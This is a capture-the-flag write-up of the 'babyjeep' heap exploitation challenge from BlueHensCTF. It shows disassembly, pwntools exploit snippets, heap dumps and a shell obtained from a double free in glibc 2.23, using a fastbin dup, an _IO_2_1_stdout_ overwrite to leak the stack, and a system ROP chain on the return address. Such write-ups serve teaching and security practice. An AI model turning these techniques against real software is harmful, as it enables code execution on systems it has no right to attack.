# Babyjeep: BlueHensCTF

This was heap based binary exploitation challenge, as I had exams, I didn't
get the time to look out for this, so I have sometime now, I will do it and
log the workflow here, also this challenge had a pretty double free
vulnerability which could be turn into the arbitrary write by taking advantage
of performing a fastbin dup.  
But this became an issue because of the constraints we had, listed below:-

# Overview

The `file` and `checksec` output are as given below:-

```r  
0 [13:01:54] vagrant@oracle(oracle) babyjeep> file main  
main: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically
linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=87b424e9ce17b64fbf054a68db9148d498435f89, for GNU/Linux 3.2.0,
not stripped  
0 [13:01:58] vagrant@oracle(oracle) babyjeep> checksec main  
[*] '/media/sf_Pwning/CTFs/BlueHens/pwn/babyjeep/main'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
```

# Vulnerability

```r  
[0x000010e0]> pdf @sym.delete  
           ; CALL XREF from main @ 0x146c  
┌ 96: sym.delete ();  
│           ; var int64_t var_4h @ rbp-0x4  
│           0x000012f4      55             push rbp  
│           0x000012f5      4889e5         mov rbp, rsp  
│           0x000012f8      4883ec10       sub rsp, 0x10  
│           0x000012fc      488d3d1c0d00.  lea rdi, str.Index          ;
0x201f ; "Index" ; const char *s  
│           0x00001303      e838fdffff     call sym.imp.puts           ; int
puts(const char *s)  
│           0x00001308      488d45fc       lea rax, [var_4h]  
│           0x0000130c      4889c6         mov rsi, rax  
│           0x0000130f      488d3dfa0c00.  lea rdi, [0x00002010]       ; "%d"
; const char *format  
│           0x00001316      b800000000     mov eax, 0  
│           0x0000131b      e890fdffff     call sym.imp.__isoc99_scanf ; int
scanf(const char *format)  
│           0x00001320      8b45fc         mov eax, dword [var_4h]  
│           0x00001323      85c0           test eax, eax  
│       ┌─< 0x00001325      782a           js 0x1351  
│       │   0x00001327      8b45fc         mov eax, dword [var_4h]  
│       │   0x0000132a      83f809         cmp eax, 9  
│      ┌──< 0x0000132d      7f22           jg 0x1351  
│      ││   0x0000132f      8b45fc         mov eax, dword [var_4h]  
│      ││   0x00001332      4898           cdqe  
│      ││   0x00001334      488d14c50000.  lea rdx, [rax*8]  
│      ││   0x0000133c      488d057d2d00.  lea rax, obj.chungus        ;
0x40c0  
│      ││   0x00001343      488b0402       mov rax, qword [rdx + rax]  
│      ││   0x00001347      4889c7         mov rdi, rax                ; void
*ptr  
│      ││   0x0000134a      e8e1fcffff     call sym.imp.free           ; void
free(void *ptr)  
│     ┌───< 0x0000134f      eb01           jmp 0x1352  
│     │││   ; CODE XREFS from sym.delete @ 0x1325, 0x132d  
│     │└└─> 0x00001351      90             nop  
│     │     ; CODE XREF from sym.delete @ 0x134f  
│     └───> 0x00001352      c9             leave  
└           0x00001353      c3             ret  
```

As you can see that the `obj.chungus` is not being checked for itself being
already free or this pointer is not being updated once `free(chungus[idx])` is
called.  
The vulnerability was in this binary was of the double free and the given libc
was `GLIBC 2.23`, so from that we know it could be considered to be just
double free.  
Also, the `show` function had UAF as well, allowing us to leak addresses.

##### Constraints

The reasonable constraint we had here is size check for the allocation which
was only limited for the fastbin size apparently, even less being `111`.

# Exploitation

For the sake of understanding, I will split the exploit in 4 section, are as
follows:-

* Heap Leak  
* LIBC Leak  
* Preparing for RIP control  
* Get Shell

### Heap Leak

This is the foremost thing to do, meaning that we have to have a heap leak to
carry out the whole exploit. So, to do so, we will just perform double free
from the `delete` function and use the UAF in the `show` to leak the heap
address, since `fd` of the chunk woule be populated as multiple chunks from
the same size would be `free`. the linked list would be populated, hence
giving us address of a chunk.

```py  
malloc(0,0x40,b"A")  # chungus[0]  
malloc(1,0x40,b"B")  # chungus[1]  
malloc(2,0x40,b"C")  # chungus[2]  
malloc(3,0x40,b"D")  # chungus[3]  
malloc(4,0x40,b"E")  # chungus[4]

free(0)  
free(1)  
free(0)  
```  
Now, the free list would be ` chunk[0]->chunk[1]->chunk[0]`. Now, we will leak
the heap address.

```py  
heap_leak = show(0)[1:7]  
heap_leak = u64(heap_leak+b"\x00\x00")  
log.info(f"HEAP:  {hex(heap_leak)}")  
```

### LIBC Leak

Now, we have the heap leak, so we could craft an overlapping chunk such that
creating a fake chunk making it look like a chunk that will belong to the
smallbin once `free`'d. This sounds a bit intimidating but it is not, if you
figure out the pattern. I'll try my best to simplify:-

We will first, reuqest for `chunk[0]`, this will give us the ability to
overwrite the `fd` of the `chunk[0]` such that the it will be returned in th
next allocation request from the same bin.

Let's see for now:-

```py  
malloc(0,0x40,p64(heap_leak-0x10)+p64(0x0)*6+p64(0x51))  
```

We will get the `chunk[0]`, now we make the `fd` of it pointing to the
`chunk[1] - 0x10` and continue to fill the buffer such that the memory content
of the heap looks like:-

```r  
gef➤  x/40xg 0x55a76febb060 - 0x60  
0x55a76febb000: 0x0000000000000000      0x0000000000000051  <--  chunk[0]  
0x55a76febb010: 0x000055a76febb040      0x0000000000000000  
0x55a76febb020: 0x0000000000000000      0x0000000000000000  
0x55a76febb030: 0x0000000000000000      0x0000000000000000  
0x55a76febb040: 0x0000000000000000      0x0000000000000051  <--  fake_chunk  
0x55a76febb050: 0x0000000000000000      0x0000000000000051  <--  chunk[1]  
0x55a76febb060: 0x000055a76febb000      0x0000000000000000  
0x55a76febb070: 0x0000000000000000      0x0000000000000000  
```

> The pointers pointed by the bin head would point directly to `chunk + 0x10`
> i.e. from the `fd`.  
Now, we will just go on with getting the chunks and work usually:-

```py  
malloc(1,0x40,b"A")  
malloc(5,0x40,b"B")  
```

Now, for next allocation, we will get the `0x55...40` because what was the
value of the `fd` of the `chunk[1]`. Now, since we created a `chunk[1]` with
the size to be pointed at that, we will be able to tamper the `chunk[1]`
metadata.

```py  
malloc(6,0x40,p64(0x0)+p64(0xf1))  
```

Doing so:-

```r  
0x55a76febb040: 0x0000000000000000      0x0000000000000051  
0x55a76febb050: 0x0000000000000000      0x00000000000000f1  
0x55a76febb060: 0x000055a76febb041      0x0000000000000000  
```

Now, when we free the `chunk[1]` it will go into the unsorted bin and the `fd`
and `bk` would be populated with the `main_arena` address, hence using the UAF
from the `show` function, we will get the `main_arena` address, apparently,
the LIBC base address.

```py  
free(1)  
libc_leak = show(1)[1:7]  
libc_leak = u64(libc_leak+b"\x00\x00")  
libc.address = libc_leak - 0x3c4b78  
```  
Heap:-

```r  
0x55962973d040: 0x0000000000000000      0x0000000000000051  
0x55962973d050: 0x0000000000000000      0x00000000000000f1  
0x55962973d060: 0x00007fc95f874b78      0x00007fc95f874b78  
```

# Preparing for the RIP Control

To do the said, we have to go the way, we will first create a fake chunk on
top of the `_IO_2_1_stdout_`, at best we do this because implying many of the
few techniques of simply overwriting the `__malloc_hook` from here didn't
worked, so to get the RIP control, the way to go from here is create a chunk
of some sort near the `_IO_2_1_stdout_`.

Now, first we will attempt to make the chunk of size `0x71` and peform double
free to create chunk at the `_IO_2_1_stdout` by overwriting the `fd`:-

```py  
malloc(0,0x40,b"A")  
malloc(1,0x40,b"B")  
malloc(2,0x40,b"C")

malloc(0,0x60,b"A")  
malloc(1,0x60,b"B")  
malloc(2,0x60,b"C")

free(0)  
free(2)  
free(0)  
```

Now, we will overwrite the `fd` of the `chunk[0]` with the an address from the
`_IO_2_1_stdout` region such that it would suffice the size check.

```py  
malloc(0,0x60,p64(IO_2_1_stdout))  
malloc(5,0x60,"A")  
malloc(2,0x60,"B")  
malloc(3,0x60,b"C"*3+p64(0x0)*4+p64(0x71)+p64(0x0))  
```

Now, this will create a chunk near the `_IO_2_1_stdout_`. The first chunk
would look like:-

```r  
0x7f193ff705f8 <_IO_2_1_stderr_+184>:   0x0000000000000000
0x0000000000000000  
0x7f193ff70608 <_IO_2_1_stderr_+200>:   0x0000000000000000
0x0000000000000071  
```

Now, since having near a chunk near the `_IO_2_1_stderr_`, we will just now
overwrite the following data as such:-

```r  
$4 = {  
 file = {  
   _flags = 0xfbad2887,  
   _IO_read_ptr = 0x7f193ff706a3 <_IO_2_1_stdout_+131> "\n",  
   _IO_read_end = 0x7f193ff706a3 <_IO_2_1_stdout_+131> "\n",  
   _IO_read_base = 0x7f193ff706a3 <_IO_2_1_stdout_+131> "\n",  
   _IO_write_base = 0x7f193ff706a3 <_IO_2_1_stdout_+131> "\n",  
   _IO_write_ptr = 0x7f193ff706a3 <_IO_2_1_stdout_+131> "\n",  
   _IO_write_end = 0x7f193ff706a3 <_IO_2_1_stdout_+131> "\n",  
   _IO_buf_base = 0x7f193ff706a3 <_IO_2_1_stdout_+131> "\n",  
   _IO_buf_end = 0x7f193ff706a4 <_IO_2_1_stdout_+132> "",  
```

We will make this as following:-

```r  
$4 = {  
 file = {  
   _flags = 0xfbad1800,  
   _IO_read_ptr = 0 <_IO_2_1_stdout_+131> "\n",  
   _IO_read_end = 0 <_IO_2_1_stdout_+131> "\n",  
   _IO_read_base = 0 <_IO_2_1_stdout_+131> "\n",  
   _IO_write_base = environ <_IO_2_1_stdout_+131> "\n",  
   _IO_write_ptr = environ+0x20 <_IO_2_1_stdout_+131> "\n",  
   _IO_write_end = environ+0x20 <_IO_2_1_stdout_+131> "\n",  
   _IO_buf_base = environ+0x20 <_IO_2_1_stdout_+131> "\n",  
   _IO_buf_end = environ+0x21 <_IO_2_1_stdout_+132> "",  
```

This will result in leaking the stack address, from here we can calculate
stack address as such that we will calculate the `ret` value so that we will
take advantage of it.

```py  
malloc(0,0x60,p64(_IO_2_1_stderr_200))  
malloc(5,0x60,"A")  
malloc(2,0x60,"B")  
malloc(3,0x60,b"A"*8+p64(0xfbad1800)+p64(0x0)*3+p64(environ)+p64(environ+0x20)*3+p64(environ+0x21))  
```

Now, once any IO based function will be called, we will get the leaks:-

```py  
stack_leak = p.recvuntil(b"Malloc")

stack_leak = u64(stack_leak[1:9])  
ret = stack_leak - 0x110 - 0x43  
```

That being done, we can now move on to the `get_shell` part since from here we
have the `ret` address, we can just do double free again and overwrite the
return address, getting the RIP control.

# Get Shell

Now, we will fix the chunks again by allocating the `0x71` chunks:-

```py  
malloc(0,0x60,b"A")  
malloc(1,0x60,b"B")  
malloc(2,0x60,b"C")  
malloc(3,0x60,b"A")  
malloc(4,0x60,b"B")  
malloc(5,0x60,b"C")

free(0)  
free(2)  
free(0)  
```

Now, we will just put the `ret` at `fd` of the `chunk[0]` also sufficing the
size check done by the `malloc` so no exceptions happen, now we will just
allocate chunks and overwrite the `ret` with a simple ROP chain:-

```py  
malloc(0,0x60,p64(ret))  
malloc(5,0x60,"A")  
malloc(2,0x60,"B")  
malloc(3,0x60,b"A"*19+p64(pop_rdi)+p64(binsh)+p64(system))  
```

Now, we will get the shell:-

```r  
1 [14:58:13] vagrant@oracle(oracle) babyjeep> python3 xpl.py  
[+] Starting local process './main': pid 3162  
[*] '/media/sf_Pwning/CTFs/BlueHens/pwn/babyjeep/libc.so.6'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[*] HEAP:  0x563be9d8a050  
[*] LIBC:  0x7f93bf897000  
[*] ret :  0x7ffc3adc4215  
[*] Switching to interactive mode  
$ whoami  
vagrant  
$ ls -la  
total 20176  
drwxrwxr-x 1 vagrant vagrant     4096 Mar 26 14:58 .  
drwxrwxr-x 1 vagrant vagrant     4096 Mar 21 16:00 ..  
-rw------- 1 vagrant vagrant  4472832 Mar 26 14:58 core  
-rw-r--r-- 1 vagrant vagrant 16603959 Mar 25 16:51 gadgets.lst  
-rwxrwxr-x 1 vagrant vagrant  1868984 Mar 20 22:50 libc.so.6  
-rwxrwxr-x 1 vagrant vagrant    17344 Mar 20 22:51 main  
-rw-rw-r-- 1 vagrant vagrant     2502 Mar 26 14:58 xpl.py  
$  
[*] Interrupted  
```

Original writeup
(https://github.com/D4mianWayne/PwnLand/tree/master/CTFs/BlueHens2021/babyjeep).